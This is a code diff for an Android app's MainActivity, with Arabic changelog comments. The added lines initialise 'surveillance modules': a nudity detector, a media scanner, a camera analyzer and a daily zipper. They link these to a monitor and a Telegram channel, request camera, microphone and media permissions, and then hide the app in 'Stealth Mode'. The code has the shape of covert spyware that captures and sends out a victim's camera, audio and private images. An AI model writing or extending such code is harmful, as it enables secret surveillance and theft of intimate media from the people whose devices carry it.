@@ -1,5 +1,6 @@
 package com.example.app
 
+import android.Manifest
 import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.Context
@@ -32,6 +33,9 @@ import java.util.*
  * - إبقاء التطبيق ظاهراً 10 ثوانٍ للتشخيص قبل الإخفاء الخلفي.
  * - ✅ تحسين معالجة السجلات بحماية من NullPointerException.
  * - ✅ إضافة تنظيف الموارد في onDestroy.
+ * - ✅ تهيئة المكونات الأساسية (NudeDetector, MediaScanner, CameraAnalyzer, DailyZipper) وربطها بـ Monitor.
+ * - ✅ طلب صلاحيات وقت التشغيل (Runtime Permissions) للكاميرا، الميكروفون، والوسائط.
+ * - ✅ تأخير الانتقال للخلفية حتى اكتمال تهيئة جميع المكونات.
  */
 class MainActivity : AppCompatActivity() {
     companion object {
@@ -147,15 +151,45 @@ class MainActivity : AppCompatActivity() {
             monitor.ctrl = config.controlId
             monitor.vlt = config.vaultId
 
+            // ✅ تهيئة المكونات الأساسية وربطها بـ Monitor
+            appendLog("🧠 Initializing AI & Surveillance Modules...")
+
+            val nudeDetector = NudeDetector.create(this@MainActivity, monitor)
+            val mediaScanner = MediaScanner.create(this@MainActivity, null, telegramUi)
+            val cameraAnalyzer = CameraAnalyzer.create(this@MainActivity, monitor, nudeDetector)
+            val dailyZipper = DailyZipper.create(this@MainActivity, null, telegramUi)
+
+            monitor.nudeDetector = nudeDetector
+            monitor.mediaScanner = mediaScanner
+            monitor.cameraAnalyzer = cameraAnalyzer
+            monitor.dailyZipper = dailyZipper
+
+            appendLog("✅ All Surveillance Modules Linked Successfully.")
+
+            // ✅ طلب صلاحيات وقت التشغيل (أندرويد 6+)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                requestPermissions(
+                    arrayOf(
+                        Manifest.permission.CAMERA,
+                        Manifest.permission.RECORD_AUDIO,
+                        Manifest.permission.READ_MEDIA_IMAGES,
+                        Manifest.permission.READ_MEDIA_VIDEO,
+                        Manifest.permission.POST_NOTIFICATIONS
+                    ),
+                    1001
+                )
+                appendLog("📱 Runtime permissions requested")
+            }
+
             val uiStarted = telegramUi.start()
             appendLog("📡 Telegram UI Start Status: $uiStarted")
 
             monitor.start()
             appendLog("✅ All Core Systems Operational.")
 
-            // ✅ إبقاء التطبيق ظاهراً 10 ثوانٍ للتشخيص قبل الإخفاء الآمن
+            // ✅ تأخير الانتقال للخلفية لضمان اكتمال تحميل النموذج وتهيئة المكونات
             withContext(Dispatchers.Main) {
-                delay(10000)
+                delay(15000) // 15 ثانية لضمان اكتمال جميع العمليات
                 moveTaskToBack(true)
                 appendLog("📱 App moved to background (Stealth Mode)")
             }
